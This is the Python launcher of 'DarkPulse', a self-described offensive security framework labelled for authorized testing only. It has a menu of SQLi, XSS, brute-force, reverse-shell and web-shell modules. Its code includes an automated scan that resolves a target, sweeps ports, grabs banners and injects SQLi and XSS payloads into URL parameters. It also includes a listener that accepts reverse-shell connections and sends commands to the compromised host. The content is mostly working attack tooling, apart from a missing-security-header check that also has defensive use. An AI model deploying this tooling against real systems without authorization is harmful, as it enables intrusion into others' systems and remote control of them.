#!/usr/bin/env python3
"""
DarkPulse v1.0 — Advanced Offensive Security Framework
Developer: maxod 👑
Use: Authorized penetration testing only
"""
import os, sys, time
from core.config import *

def check_modules():
    missing = []
    for m in ["modules.recon", "modules.webattack", "modules.bruteforce", "modules.payload", "modules.exploit"]:
        try:
            __import__(m)
        except ImportError:
            missing.append(m)
    if missing:
        print(f"\n\033[91m[!] Missing modules: {', '.join(missing)}\033[0m")
        print(f"\033[93m[*] Make sure you are in the DarkPulse directory\033[0m")
        sys.exit(1)

def main():
    os.system("clear" if os.name != "nt" else "cls")

    from core.banner import show
    show()

    check_modules()

    from modules import recon, webattack, bruteforce, payload, exploit

    while True:
        print(f"\n{R2}{B}  ╔═══════════════════════════════════════════════════════╗{E}")
        print(f"  {R2}║{E}  {R3}{B}☸  DARKPULSE OFFENSIVE FRAMEWORK v1.0  ☸{E}            {R2}║{E}")
        print(f"  {R2}╠═══════════════════════════════════════════════════════╣{E}")
        print(f"  {R2}║{E}                                                       {R2}║{E}")
        print(f"  {R2}║{E}  {R3}{B}[1]{E} {G2}RECON       {D}— Port Scan • DNS • Ping Sweep{E}      {R2}║{E}")
        print(f"  {R2}║{E}  {R3}{B}[2]{E} {G2}WEBATTACK   {D}— SQLi • XSS • LFI • CMDi{E}          {R2}║{E}")
        print(f"  {R2}║{E}  {R3}{B}[3]{E} {G2}BRUTEFORCE  {D}— Hash Crack • Dir • Login • FTP{E}    {R2}║{E}")
        print(f"  {R2}║{E}  {R3}{B}[4]{E} {G2}PAYLOAD     {D}— Rev Shells • Web Shells • Encode{E}  {R2}║{E}")
        print(f"  {R2}║{E}  {R3}{B}[5]{E} {G2}EXPLOIT     {D}— Headers • CORS • Redirect{E}         {R2}║{E}")
        print(f"  {R2}║{E}                                                       {R2}║{E}")
        print(f"  {R2}║{E}  {GD}{B}[6]{E} {W}QUICK SCAN  {D}— Fast Recon + Web Vuln Combo{E}      {R2}║{E}")
        print(f"  {R2}║{E}  {GD}{B}[7]{E} {W}LISTENER    {D}— Start Netcat Listener{E}             {R2}║{E}")
        print(f"  {R2}║{E}                                                       {R2}║{E}")
        print(f"  {R2}║{E}  {D}[0] Exit{E}                                            {R2}║{E}")
        print(f"  {R2}╚═══════════════════════════════════════════════════════╝{E}")
        print(f"\n  {D}  ──[ 👑 maxod | Authorized Testing Only ]──{E}")

        choice = input(f"\n  {R3}{B}DarkPulse>{E} ").strip()

        if choice == "0":
            print(f"\n  {R2}[*] DarkPulse shutting down...{E}")
            print(f"  {G}[*] Stay safe, maxod 👑{E}\n")
            break
        elif choice == "1":
            recon.menu()
        elif choice == "2":
            webattack.menu()
        elif choice == "3":
            bruteforce.menu()
        elif choice == "4":
            payload.menu()
        elif choice == "5":
            exploit.menu()
        elif choice == "6":
            quick_scan()
        elif choice == "7":
            start_listener()
        else:
            print(f"  {R}[-] Invalid option{E}")

def quick_scan():
    from core.engine import resolve, mass_scan, banner_grab, extract_params, build_url_with_param, http_get
    from core.config import TOP_PORTS, SQLI_PAYLOADS, SQL_ERRORS, XSS_PAYLOADS, G, G2, GD, R, R2, R3, RD, D, W, B, E

    target = input(f"\n  {GD}Target URL or Domain:{E} ").strip()
    if not target: return

    print(f"\n  {R2}{B}  ⚡ QUICK SCAN INITIATED ⚡{E}")
    print(f"  {R3}  {'═'*50}{E}")

    print(f"\n  {GD}[PHASE 1] RECON{E}")
    host = target.replace("http://","").replace("https://","").split("/")[0].split(":")[0]
    ip = resolve(host)
    if ip:
        print(f"  {G}[+] Resolved: {ip}{E}")
        ports = list(TOP_PORTS.keys())[:20]
        print(f"  {G2}[*] Scanning top 20 ports...{E}")
        open_p = mass_scan(ip, ports, threads=50)
        for p in open_p:
            svc = TOP_PORTS.get(p, "unknown")
            ban = banner_grab(ip, p)
            print(f"  {G2}  [+] {p:<8} {G}{svc:<12} {W}{ban}{E}")
    else:
        print(f"  {R}[-] Cannot resolve target{E}")

    if target.startswith("http"):
        print(f"\n  {GD}[PHASE 2] WEB VULNERABILITIES{E}")
        params = extract_params(target)
        if params:
            for param in params:
                print(f"  {GD}[→] Testing param: {param}{E}")
                for payload in SQLI_PAYLOADS[:8]:
                    test_url = build_url_with_param(target, param, payload)
                    r = http_get(test_url, timeout=5)
                    if r["code"] == 0: continue
                    for sig in SQL_ERRORS:
                        if sig.lower() in r["body"].lower():
                            print(f"  {R2}  [!!!] SQLi: {payload}{E}")
                            break
                for payload in XSS_PAYLOADS[:5]:
                    test_url = build_url_with_param(target, param, payload)
                    r = http_get(test_url, timeout=5)
                    if payload in r.get("body",""):
                        print(f"  {R2}  [!!!] XSS: {payload}{E}")
        else:
            print(f"  {D}  [~] No URL parameters to test{E}")

        print(f"\n  {GD}[PHASE 3] SECURITY HEADERS{E}")
        r = http_get(target, timeout=6)
        if r["code"] > 0:
            checks = {
                "strict-transport-security": "HSTS Missing",
                "x-content-type-options": "X-Content-Type Missing",
                "x-frame-options": "X-Frame-Options Missing",
                "content-security-policy": "CSP Missing",
                "x-xss-protection": "XSS Protection Missing",
                "referrer-policy": "Referrer Policy Missing",
            }
            hdrs_lower = {k.lower(): v for k, v in r["headers"].items()}
            for header, issue in checks.items():
                if header not in hdrs_lower:
                    print(f"  {RD}  [!] {issue}{E}")
                else:
                    print(f"  {G}  [+] {header}: {hdrs_lower[header][:40]}{E}")

    print(f"\n  {R2}{B}  ⚡ QUICK SCAN COMPLETE ⚡{E}")
    print(f"  {R3}  {'═'*50}{E}")

def start_listener():
    import socket
    print(f"\n  {GD}{B}  NETCAT LISTENER{E}")
    lport = input(f"  {GD}Port (4444):{E} ").strip() or "4444"
    print(f"\n  {R2}[!] Starting listener on port {lport}...{E}")
    print(f"  {G}[*] Waiting for reverse shell connection...{E}")
    print(f"  {D}[*] Ctrl+C to stop{E}\n")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", int(lport)))
        s.listen(1)
        print(f"  {G2}[+] Listening on 0.0.0.0:{lport}...{E}")
        conn, addr = s.accept()
        print(f"\n  {R2}{B}  [!!!] CONNECTION FROM {addr[0]}:{addr[1]}{E}\n")
        while True:
            cmd = input(f"  {R3}shell>{E} ")
            if cmd.lower() in ["exit", "quit"]:
                conn.close()
                break
            conn.send(cmd.encode() + b"\n")
            data = conn.recv(4096).decode("utf-8", errors="ignore")
            print(f"  {G}{data}{E}")
        s.close()
    except KeyboardInterrupt:
        print(f"\n  {R}[*] Listener stopped{E}")
    except Exception as e:
        print(f"  {R}[-] Error: {e}{E}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {R2}[*] Ctrl+C detected. Exiting...{E}")
        print(f"  {G}[*] maxod 👑 says goodbye hacker!{E}\n")
        sys.exit(0)
